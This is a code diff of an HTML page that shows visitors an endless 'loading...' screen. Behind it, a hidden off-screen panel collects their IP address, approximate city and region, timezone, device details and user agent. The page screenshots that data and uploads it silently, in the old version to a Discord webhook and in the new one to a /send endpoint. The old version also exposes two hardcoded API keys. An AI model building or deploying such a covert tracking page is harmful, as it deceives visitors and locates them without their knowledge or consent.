@@ -1,124 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Loading…</title>
+
 <style>
 html,body{height:100%;margin:0}
 body{
-  background:#000;
-  color:#fff;
+  background:#000;color:#fff;
   font-family:Inter,system-ui,Arial,sans-serif;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
+  display:flex;align-items:center;justify-content:center;flex-direction:column
 }
-.big{font-size:36px;letter-spacing:1px}
-.sub{font-size:12px;margin-top:12px;opacity:.6}
+.big{font-size:36px}
+.sub{font-size:12px;opacity:.6;margin-top:10px}
+
 #capture-root{
-  position:absolute; left:-9999px; top:-9999px; width:760px; padding:20px; background:#0b0b0b; border-radius:8px;
+  position:absolute;left:-9999px;top:-9999px;
+  width:760px;padding:20px;background:#0b0b0b;border-radius:8px
 }
 .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
 .card{background:#080808;padding:10px;border-radius:8px}
 .card strong{display:block;font-size:15px}
-.label{font-size:11px;color:#999;margin-top:6px}
+.label{font-size:11px;color:#999}
 #statusHidden{font-size:11px;color:#aaa;margin-top:10px}
 </style>
 </head>
-<body>
-  <div class="big">loading...</div>
-  <div class="sub">this usually takes about 1–20 seconds</div>
 
-  <div id="capture-root" aria-hidden="true">
+<body>
+  <!-- visible forever -->
+  <div class="big">loading...</div>
+  <div class="sub">this usually takes 1–20 seconds</div>
+
+  <!-- hidden capture page -->
+  <div id="capture-root">
     <h2>Device & Network Snapshot</h2>
     <div class="grid">
-      <div class="card"><strong id="ip">Loading...</strong><div class="label">IP Address</div></div>
-      <div class="card"><strong id="country">Loading...</strong><div class="label">Country</div></div>
-      <div class="card"><strong id="avgAddress">Loading...</strong><div class="label">Approx Location</div></div>
-      <div class="card"><strong id="timezone">Loading...</strong><div class="label">Timezone</div></div>
-      <div class="card"><strong id="vpn">Checking…</strong><div class="label">VPN / Proxy</div></div>
-      <div class="card"><strong id="vpnProvider">N/A</strong><div class="label">VPN Provider</div></div>
-      <div class="card"><strong id="bot">Checking…</strong><div class="label">Bot Detected</div></div>
-      <div class="card"><strong id="hosting">Checking…</strong><div class="label">Hosting / Datacenter</div></div>
-      <div class="card"><strong id="device">Loading…</strong><div class="label">Device / OS</div></div>
-      <div class="card"><strong id="screenInfo">Loading…</strong><div class="label">Screen</div></div>
+      <div class="card"><strong id="ip">...</strong><div class="label">IP</div></div>
+      <div class="card"><strong id="country">...</strong><div class="label">Country</div></div>
+      <div class="card"><strong id="location">...</strong><div class="label">Approx location</div></div>
+      <div class="card"><strong id="timezone">...</strong><div class="label">Timezone</div></div>
+      <div class="card"><strong id="bot">...</strong><div class="label">Bot Likelihood</div></div>
+      <div class="card"><strong id="device">...</strong><div class="label">Device</div></div>
     </div>
     <div id="statusHidden">Preparing…</div>
   </div>
 
 <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-
 <script>
 const el=id=>document.getElementById(id);
-const safe=v=>(v===undefined||v===null||v==="")?"N/A":v;
+const safe=v=>(v??"N/A");
 
-/* CONFIG */
-const GEO_API_KEY = "70f4d8c5dc604942a9f08a8f26261856";
-const TZ_API_KEY  = "4b975310867d44458fa5d6822ebfeb5e";
-const IPINFO_TOKEN = "API_TOKEN_HERE"; // Replace with your IPinfo Lite token
-const DISCORD_WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Replace with your webhook
-
-/* BOT HEURISTICS */
 function botScore(){
   let s=0;
-  if(/bot|crawl|spider|headless|puppeteer|selenium/i.test(navigator.userAgent)) s+=2;
+  if(/bot|headless|puppeteer|selenium/i.test(navigator.userAgent)) s+=2;
   if(navigator.webdriver) s+=2;
   if(!navigator.plugins?.length) s+=1;
-  if(!navigator.languages?.length) s+=1;
   return s;
 }
 
 async function run(){
   try{
-    el("statusHidden").textContent = "Fetching public IP…";
-    const ipResp = await fetch("https://api.ipify.org?format=json");
-    const {ip} = await ipResp.json();
-    el("ip").textContent = safe(ip);
+    el("statusHidden").textContent="Fetching IP…";
+    const ip= (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
+    el("ip").textContent=ip;
 
-    el("statusHidden").textContent = "Fetching geolocation…";
-    const geoResp = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${GEO_API_KEY}&ip_address=${ip}`);
-    const geo = await geoResp.json();
-    el("country").textContent = safe(geo.country);
-    el("avgAddress").textContent = `${safe(geo.city)}${geo.city?", ":""}${safe(geo.region)}${geo.postal_code?", "+geo.postal_code:""}`;
+    el("statusHidden").textContent="Fetching geo…";
+    const geo=await (await fetch(`/geo?ip=${ip}`)).json();
+    el("country").textContent=safe(geo.country);
+    el("location").textContent=`${safe(geo.city)}, ${safe(geo.region)}`;
+    el("timezone").textContent=safe(geo.timezone);
 
-    const tzResp = await fetch(`https://timezone.abstractapi.com/v1/current_time/?api_key=${TZ_API_KEY}&location=${encodeURIComponent(geo.city||ip)}`);
-    const tz = await tzResp.json();
-    el("timezone").textContent = safe(tz.timezone_location || tz.abbreviation);
+    el("bot").textContent=botScore()>=3?"Likely":"No";
+    el("device").textContent=
+      `${navigator.platform} · ${navigator.hardwareConcurrency||"?"} cores · ${navigator.deviceMemory||"?"}GB`;
 
-    el("statusHidden").textContent = "Fetching IPinfo data…";
-    const ipinfoResp = await fetch(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
-    const ipinfo = await ipinfoResp.json();
-    const privacy = ipinfo.privacy || {};
+    el("statusHidden").textContent="Capturing…";
+    await new Promise(r=>setTimeout(r,300));
 
-    // Lite plan does not include VPN detection, so best-effort
-    el("vpn").textContent = privacy.vpn || privacy.proxy || privacy.tor || privacy.relay ? "Yes" : "N/A";
-    el("vpnProvider").textContent = safe(privacy.service);
-    el("hosting").textContent = privacy.hosting ? "Yes" : "No";
+    const canvas=await html2canvas(el("capture-root"),{scale:1.2});
+    const blob=await (await fetch(canvas.toDataURL())).blob();
 
-    el("bot").textContent = botScore()>=3?"Yes (Likely)":"No";
-
-    el("device").textContent = `${navigator.platform} · ${navigator.hardwareConcurrency||"?"} cores · ${navigator.deviceMemory||"?"}GB`;
-    el("screenInfo").textContent = `${screen.width}×${screen.height}`;
-
-    el("statusHidden").textContent = "Capturing screenshot…";
-    await new Promise(r=>setTimeout(r,400));
-    const canvas = await html2canvas(el("capture-root"),{scale:1.2});
-    const blob = await (await fetch(canvas.toDataURL())).blob();
-    const form = new FormData();
+    const form=new FormData();
     form.append("file",blob,"snapshot.png");
-    form.append("content",`Snapshot | IP: ${el("ip").textContent} | VPN: ${el("vpn").textContent} | Bot: ${el("bot").textContent} | ${new Date().toLocaleString()}`);
+    form.append("meta",JSON.stringify({
+      ip,bot:el("bot").textContent,
+      ua:navigator.userAgent,
+      time:new Date().toISOString()
+    }));
 
-    el("statusHidden").textContent = "Sending…";
-    await fetch(DISCORD_WEBHOOK_URL,{method:"POST",body:form});
-    el("statusHidden").textContent = "Sent";
+    el("statusHidden").textContent="Sending…";
+    await fetch("/send",{method:"POST",body:form});
+
+    el("statusHidden").textContent="Sent";
   }catch(e){
     console.error(e);
-    el("statusHidden").textContent = "Error (see console)";
+    el("statusHidden").textContent="Error";
   }
 }
-
 setTimeout(run,300);
 </script>
 </body>
